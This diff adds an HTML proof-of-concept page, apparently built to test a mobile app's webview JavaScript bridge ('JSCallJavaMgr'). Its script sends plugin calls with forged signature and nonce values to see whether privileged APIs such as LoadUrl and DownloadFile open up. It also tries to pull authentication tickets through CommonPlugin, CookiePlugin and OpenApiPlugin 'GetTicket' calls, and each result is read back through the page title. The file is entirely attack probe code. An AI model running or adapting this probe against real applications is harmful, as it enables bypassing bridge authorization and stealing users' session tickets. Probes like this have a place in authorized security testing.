@@ -1,0 +1,46 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P23TB</title></head>
+<body><h1>P23TB</h1>
+<script>
+document.title='P23TB-START';
+var q=[], busy=false;
+function note(t){ q.push(String(t)); kick(); }
+function kick(){
+  if(busy || !q.length) return;
+  busy=true; document.title=q.shift();
+  setTimeout(function(){ busy=false; kick(); }, 900);
+}
+function call(mod, method, param){
+  if(!window.JSCallJavaMgr){ note('NOJSB'); return; }
+  window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+    callback:'window.__wmpoc', module:mod, method:method, param:param||{},
+    callId:mod+'.'+method
+  }));
+}
+function norm(res){
+  if(typeof res==='string'){ try{ res=JSON.parse(res); }catch(e){ return {callId:'RAW', code:-1, message:String(res).slice(0,80)}; } }
+  return res||{};
+}
+window.__wmpoc=function(res){
+  res=norm(res);
+  var msg=String(res.message||JSON.stringify(res)).replace(/\|/g,'/');
+  var deny=msg.indexOf('URL denied')>=0 || msg.indexOf('not config')>=0;
+  note((deny?'D':'A')+':'+(res.callId||'?').replace('Plugin.','/')+':'+res.code+':'+msg.slice(0,72));
+};
+var steps=[
+  function(){ note('JSB='+!!window.JSCallJavaMgr); },
+  function(){ call('OpenApiPlugin','JsApiConfig',{url:location.href,timestamp:'1',nonceStr:'a',signature:'b',corpId:'1',jsApiList:['LoadUrl','DownloadFile']}); },
+  function(){ call('OpenApiPlugin','JsApiAgentConfig',{url:location.href,timestamp:'1',nonceStr:'a',signature:'b',corpId:'1',agentId:'1',jsApiList:['LoadUrl']}); },
+  function(){ call('CommonPlugin','GetTicket',{}); },
+  function(){ call('CookiePlugin','GetTicket',{}); },
+  function(){ call('OpenApiPlugin','GetTicket',{}); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ setTimeout(function(){ note('P23TB-DONE'); }, 1600); return; }
+  try{ steps[i](); }catch(e){ note('EX:'+e); }
+  i++; setTimeout(next, 800);
+}
+setTimeout(next, 400);
+</script>
+</body></html>
